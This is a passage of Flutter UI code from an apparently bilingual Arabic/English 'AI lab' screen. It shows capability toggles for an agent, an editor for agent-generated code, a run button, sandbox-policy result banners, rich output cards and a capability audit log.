                          ? 'صلاحيات الوكيل الممنوحة في QudsExecutionPolicy:'
                          : 'Agent capabilities granted in QudsExecutionPolicy:',
                      style: TextStyle(
                        fontSize: 11,
                        fontWeight: FontWeight.w700,
                        color: theme.hintColor,
                      ),
                    ),
                    const SizedBox(height: 5),
                    Wrap(
                      spacing: 6,
                      runSpacing: 4,
                      children: [
                        FilterChip(
                          key: const Key('cap_orders_read'),
                          label: const Text('ai.orders.read',
                              style: TextStyle(
                                  fontFamily: 'JetBrainsMono', fontSize: 10.5)),
                          selected: _allowOrdersRead,
                          visualDensity: VisualDensity.compact,
                          onSelected: (v) =>
                              setState(() => _allowOrdersRead = v),
                        ),
                        FilterChip(
                          key: const Key('cap_sensors_read'),
                          label: const Text('ai.sensors.read',
                              style: TextStyle(
                                  fontFamily: 'JetBrainsMono', fontSize: 10.5)),
                          selected: _allowSensorsRead,
                          visualDensity: VisualDensity.compact,
                          onSelected: (v) =>
                              setState(() => _allowSensorsRead = v),
                        ),
                        FilterChip(
                          key: const Key('cap_email_send'),
                          label: const Text('ai.email.send',
                              style: TextStyle(
                                  fontFamily: 'JetBrainsMono', fontSize: 10.5)),
                          selected: _allowEmailSend,
                          selectedColor:
                              const Color(0xFFF59E0B).withValues(alpha: 0.3),
                          visualDensity: VisualDensity.compact,
                          onSelected: (v) =>
                              setState(() => _allowEmailSend = v),
                        ),
                        FilterChip(
                          key: const Key('cap_orders_delete'),
                          label: const Text('ai.orders.delete',
                              style: TextStyle(
                                  fontFamily: 'JetBrainsMono', fontSize: 10.5)),
                          selected: _allowOrdersDelete,
                          selectedColor:
                              const Color(0xFFEF4444).withValues(alpha: 0.3),
                          visualDensity: VisualDensity.compact,
                          onSelected: (v) =>
                              setState(() => _allowOrdersDelete = v),
                        ),
                      ],
                    ),
                    const SizedBox(height: 10),
                  ],

                  // Editable AI-generated Quds code
                  Directionality(
                    textDirection: TextDirection.ltr,
                    child: Container(
                      decoration: BoxDecoration(
                        color: codeBg,
                        borderRadius: BorderRadius.circular(10),
                        border: Border.all(
                          color: theme.dividerColor.withValues(alpha: 0.25),
                        ),
                      ),
                      padding: const EdgeInsets.symmetric(
                          horizontal: 10, vertical: 6),
                      child: TextField(
                        key: const Key('ai_lab_code_field'),
                        controller: _codeController,
                        maxLines: 10,
                        minLines: 6,
                        style: const TextStyle(
                          fontFamily: 'JetBrainsMono',
                          fontSize: 11.5,
                          color: Color(0xFFE2E8F0),
                          height: 1.4,
                        ),
                        decoration: const InputDecoration(
                          border: InputBorder.none,
                          isDense: true,
                        ),
                      ),
                    ),
                  ),
                  const SizedBox(height: 10),

                  // Execute CTA
                  FilledButton.icon(
                    key: const Key('ai_lab_run_btn'),
                    onPressed: _running ? null : _runScenario,
                    style: FilledButton.styleFrom(
                      backgroundColor: _scenario.accent,
                      foregroundColor: Colors.white,
                      padding: const EdgeInsets.symmetric(vertical: 11),
                    ),
                    icon: _running
                        ? const SizedBox(
                            width: 16,
                            height: 16,
                            child: CircularProgressIndicator(
                              strokeWidth: 2,
                              color: Colors.white,
                            ),
                          )
                        : const Icon(Icons.play_arrow_rounded, size: 19),
                    label: Text(
                      _scenario.isSelfHealingDemo
                          ? (isAr
                              ? 'تشغيل دورة التحقق والتصحيح الذاتي (CodePush + .qbc)'
                              : 'Run Atomic CodePush & Self-Healing Loop')
                          : (isAr
                              ? 'تشغيل كود الوكيل محليًا داخل Quds Sandbox'
                              : 'Execute Agent Code Locally in Quds Sandbox'),
                      style: const TextStyle(
                          fontSize: 12.5, fontWeight: FontWeight.w700),
                    ),
                  ),
                ],
              ),
            ),

            // Self-healing timeline
            if (_selfHealTimeline.isNotEmpty) ...[
              const SizedBox(height: 10),
              Container(
                key: const Key('ai_self_heal_timeline'),
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  color: const Color(0xFFF59E0B).withValues(alpha: 0.10),
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(
                    color: const Color(0xFFF59E0B).withValues(alpha: 0.35),
                  ),
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.stretch,
                  children: [
                    for (final step in _selfHealTimeline)
                      Padding(
                        padding: const EdgeInsets.symmetric(vertical: 2.5),
                        child: Text(
                          step,
                          style: const TextStyle(fontSize: 11.5, height: 1.35),
                        ),
                      ),
                    if (_generatedSkillArtifact != null) ...[
                      const SizedBox(height: 6),
                      Align(
                        alignment: AlignmentDirectional.centerStart,
                        child: OutlinedButton.icon(
                          key: const Key('ai_inspect_skill_qbc_btn'),
                          onPressed: () => showDialog<void>(
                            context: context,
                            builder: (_) => QudsCompiledArtifactDialog(
                              artifact: _generatedSkillArtifact!,
                              isArabic: isAr,
                              isDark: widget.isDark,
                            ),
                          ),
                          icon: const Icon(Icons.memory_rounded, size: 15),
                          label: Text(
                            isAr
                                ? 'استعراض الملف المترجم الناتج (vip.qbc)'
                                : 'Inspect Generated Bytecode (vip.qbc)',
                            style: const TextStyle(fontSize: 11.5),
                          ),
                        ),
                      ),
                    ],
                  ],
                ),
              ),
            ],

            // Execution Result & Security Audit
            if (res != null) ...[
              const SizedBox(height: 10),
              Container(
                key: const Key('ai_lab_result_banner'),
                padding:
                    const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
                decoration: BoxDecoration(
                  color: (res.succeeded
                          ? const Color(0xFF10B981)
                          : const Color(0xFFEF4444))
                      .withValues(alpha: 0.13),
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(
                    color: (res.succeeded
                            ? const Color(0xFF10B981)
                            : const Color(0xFFEF4444))
                        .withValues(alpha: 0.45),
                  ),
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.stretch,
                  children: [
                    Row(
                      children: [
                        Icon(
                          res.succeeded
                              ? Icons.check_circle_rounded
                              : Icons.gpp_good_rounded,
                          size: 18,
                          color: res.succeeded
                              ? const Color(0xFF10B981)
                              : const Color(0xFFEF4444),
                        ),
                        const SizedBox(width: 6),
                        Expanded(
                          child: Text(
                            res.succeeded
                                ? (isAr
                                    ? 'نُفّذ بنجاح محليًا خلال ${formatLabDurationMs(res.elapsed.inMicroseconds / 1000.0)}'
                                    : 'Executed locally in ${formatLabDurationMs(res.elapsed.inMicroseconds / 1000.0)}')
                                : (isAr
                                    ? '🛡️ أوقفت سياسة الأمان التنفيذ خلال ${formatLabDurationMs(res.elapsed.inMicroseconds / 1000.0)}'
                                    : '🛡️ Blocked by Sandbox Policy in ${formatLabDurationMs(res.elapsed.inMicroseconds / 1000.0)}'),
                            style: TextStyle(
                              fontSize: 12,
                              fontWeight: FontWeight.w700,
                              color: res.succeeded
                                  ? const Color(0xFF10B981)
                                  : const Color(0xFFEF4444),
                            ),
                          ),
                        ),
                      ],
                    ),
                    if (!res.succeeded && res.error != null) ...[
                      const SizedBox(height: 5),
                      Directionality(
                        textDirection: TextDirection.ltr,
                        child: Text(
                          '${res.error}',
                          style: const TextStyle(
                            fontFamily: 'JetBrainsMono',
                            fontSize: 11,
                            color: Color(0xFFEF4444),
                          ),
                        ),
                      ),
                    ],
                    if (res.stdout.isNotEmpty) ...[
                      const SizedBox(height: 6),
                      Directionality(
                        textDirection: TextDirection.ltr,
                        child: Container(
                          padding: const EdgeInsets.all(8),
                          decoration: BoxDecoration(
                            color: codeBg,
                            borderRadius: BorderRadius.circular(7),
                          ),
                          child: SelectableText(
                            res.stdout,
                            style: const TextStyle(
                              fontFamily: 'JetBrainsMono',
                              fontSize: 11,
                              color: Color(0xFF34D399),
                            ),
                          ),
                        ),
                      ),
                    ],
                  ],
                ),
              ),

              // Rich Outputs (Plots, Tables, Forms)
              for (final out in res.outputs) ...[
                const SizedBox(height: 10),
                if (out is QudsPlot2DOutput)
                  SizedBox(
                    height: 240,
                    child: QudsPlotCanvas(
                      plot: out,
                      isDark: widget.isDark,
                    ),
                  )
                else if (out is QudsTableOutput)
                  QudsTableCard(table: out)
                else if (out is QudsFormOutput)
                  QudsFormOutputCard(
                    form: out,
                    isDark: widget.isDark,
                  ),
              ],

              // Security Capability Audit Log
              if (_auditLog.isNotEmpty) ...[
                const SizedBox(height: 10),
                Container(
                  key: const Key('ai_security_audit_log'),
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(
                    color: cardBg,
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(
                      color: theme.dividerColor.withValues(alpha: 0.2),
                    ),
                  ),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.stretch,
                    children: [
                      Text(
                        isAr
                            ? '🔒 سجل تدقيق الصلاحيات (Host Bridge Security Audit)'
                            : '🔒 Host Bridge Capability Audit Log',
                        style: const TextStyle(
                            fontSize: 11.5, fontWeight: FontWeight.w700),
                      ),
                      const SizedBox(height: 4),
                      for (final line in _auditLog)
                        Directionality(
                          textDirection: TextDirection.ltr,
                          child: Text(
                            line,
                            style: TextStyle(
                              fontFamily: 'JetBrainsMono',
                              fontSize: 10.5,
                              color: line.startsWith('BLOCKED') ||
                                      line.startsWith('ATOMIC REJECT')
                                  ? const Color(0xFFEF4444)
                                  : const Color(0xFF10B981),
                            ),
                          ),
                        ),
                    ],
                  ),
                ),
              ],
            ],
          ],
        ),
      ),
    );
  }
}
